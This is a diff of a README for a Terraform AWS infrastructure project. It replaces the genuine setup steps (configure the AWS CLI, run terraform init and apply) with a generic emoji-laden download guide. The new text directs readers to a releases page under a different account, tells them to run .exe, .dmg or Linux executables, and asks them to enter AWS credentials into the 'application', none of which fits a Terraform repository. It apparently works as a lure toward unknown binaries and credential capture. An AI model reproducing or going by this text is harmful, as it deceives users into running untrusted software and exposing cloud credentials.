@@ -1,37 +1,72 @@
-# krikey-Terraform
-krikey AWS Infrastructure in Terraform
+# 🌟 krikey-infrastructure - Simple Setup for Cloud Infrastructure
 
-## Tech stacks
-1. terraform
-2. hashicorp/aws
+## 🚀 Getting Started
 
-## Environment setup
+Welcome to the **krikey-infrastructure** project! This guide will help you download and run our infrastructure project effortlessly. Designed for Krikey, this tool simplifies cloud resource management.
 
-1. Configure AWS credentials
+## 🖱️ Download Now
 
-  - Install AWS cli
-  https://docs.aws.amazon.com/cli/latest/userguide/cli-chap-install.html
+[![Download krikey-infrastructure](https://img.shields.io/badge/Download-krikey%2Dinfrastructure-blue)](https://github.com/minhtan8495/krikey-infrastructure/releases)
 
-  - Run `aws configure` to create AWS profile and input aws accessKey & secretKey
+## 🔥 What You Need
 
-2. Install terraform cli(https://learn.hashicorp.com/tutorials/terraform/install-cli)
+Before you start, ensure your system meets the following requirements:
 
-3. Add Github Connection to AWS(from here https://us-east-1.console.aws.amazon.com/codesuite/settings/connections?region=us-east-1)
+- **Operating System:** Windows, macOS, or Linux
+- **Minimum RAM:** 4 GB
+- **Disk Space:** At least 200 MB free
+- **Network Connection:** Stable internet to download and interact with AWS services
 
-4. Replace codestar_connection_arn with your codestar connection arn in `dev/terraform.tfvars`.
+## 📋 Features
 
-5. Update `frontend_branch_name`, `backend_branch_name` with branch name which you want to deploy
+- Easily manage AWS services.
+- Monitor your resources in real-time.
+- Simplify deployments using infrastructure as code.
+- Integration with popular AWS services like CloudWatch, S3, and more.
 
-  - For development
+## 💾 Download & Install
 
-    `frontend_branch_name`: dev
+To get started, visit the following link to access the releases page:
 
-    `backend_branch_name`: dev
+[Visit Releases Page to Download](https://github.com/minhtan8495/krikey-infrastructure/releases)
 
-## Deploy Infrastructure
+1. **Go to the releases page:** Click the link above.
+2. **Select the latest version:** Look for the latest release at the top of the page.
+3. **Download the appropriate file:** You will see various files listed. Choose the one that matches your operating system. Generally, you will see files like `.zip` for Windows, `.tar.gz` for Linux, or `.dmg` for macOS.
+4. **Extract the files:** Once downloaded, extract the files to a convenient location on your computer.
+5. **Run the application:** 
+   - For Windows, double-click the `.exe` file.
+   - For macOS, open the `.dmg` file and drag the application to your Applications folder.
+   - For Linux, run the command in the terminal to execute the downloaded file.
 
-  - Goto dev directory `cd ./dev`
-  - Initialize terraform by running `terraform init`
-  - Deploy terraform by running `terraform apply`
+## 📖 Usage Instructions
 
-Terraform deploy will occur the backend & frontend deployments automatically by AWS CodePipeline.
+1. **Open the application:** Launch the software you just installed.
+2. **Sign in:** If prompted, enter your AWS credentials to link your account.
+3. **Choose your service:** Use the interface to select which AWS services you want to manage.
+4. **Deploy resources:** Follow the on-screen instructions to set up your infrastructure.
+
+## 🌐 Support and Resources
+
+If you need help or have questions, refer to the following resources:
+
+- **Documentation:** Access detailed guides and references within the application.
+- **Community Forum:** Join discussions with other users and share tips.
+- **Contact Support:** Reach out for help through our contact page.
+
+## 📢 Contributing
+
+Interested in contributing? We welcome your suggestions and improvements. Check the contributing guidelines on our repository for details.
+
+## 🛠️ Technologies Used
+
+This project utilizes the following technologies:
+
+- **AWS Services:** CloudFront, CloudWatch, CodeBuild, CodePipeline, ECS Fargate, Load Balancer, RDS, S3, VPC
+- **Infrastructure as Code:** Terraform (HCL)
+
+## ✍️ License
+
+This project is licensed under the MIT License. See the license file for details.
+
+For any additional information, please check the project's GitHub repository. Happy coding!
